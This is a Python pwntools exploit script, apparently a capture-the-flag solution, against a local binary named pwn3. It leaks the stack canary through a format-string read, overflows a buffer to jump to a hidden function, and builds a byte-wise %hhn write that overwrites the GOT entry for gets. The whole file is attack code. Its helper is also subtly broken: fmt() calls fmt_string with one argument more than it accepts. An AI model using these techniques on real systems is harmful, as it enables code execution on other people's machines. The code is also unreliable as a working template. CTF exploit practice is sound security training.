from pwn import *
# context.log_level = "debug"
p = process("./pwn3")
elf = ELF("./pwn3")

def pwn1():
	payload = "%15$p"
	p.sendline(payload)

	canary = int(p.recv(10) , 16)

	shell = elf.symbols["canary_protect_me"]
	print hex(canary)

	payload = 0x28 * "a" + p32(canary) +  "aaaa" * 3  + p32(shell)
	p.sendline(payload)
	# p.recvall()
	p.interactive()


def fmt_string(prev , target , index ):
	result = ""
	if prev < target:
		num = target - prev
		result = "%" + str(num) + "d%" + str(index) + "$hhn"
	elif prev > target:
		num = 256+  target  - prev
		result = "%" + str(num) + "d%" + str(index) + "$hhn"
	return result

def fmt(start_pos , size ,target_addr , target_num ):
	payload = ""
	p = p32 if size == 4 else p64
	for i in range(size):
		payload += p(target_addr + i)
	prev = len(payload) 
	for i in range(size):#%numd%pos$hhn
		num = target_num & 0xff
		target_num = target_num >> 8
		payload += fmt_string(prev , num , start_pos + i , p )
		prev = num

	return payload

def pwn2():
	start_pos = 5 
	shell = elf.symbols["canary_protect_me"]
	payload2 = fmt(start_pos, 4 , elf.got["gets"] , shell)
	# payload = fmtstr_payload(5 ,{elf.got["gets"] : shell}) # pwntools fmtstr_payload(index , writes{addr:value} , num )
	# print payload
	print payload2
	p.sendline(payload2)
	p.recv()
	p.interactive()

if __name__ == '__main__':
	pwn2()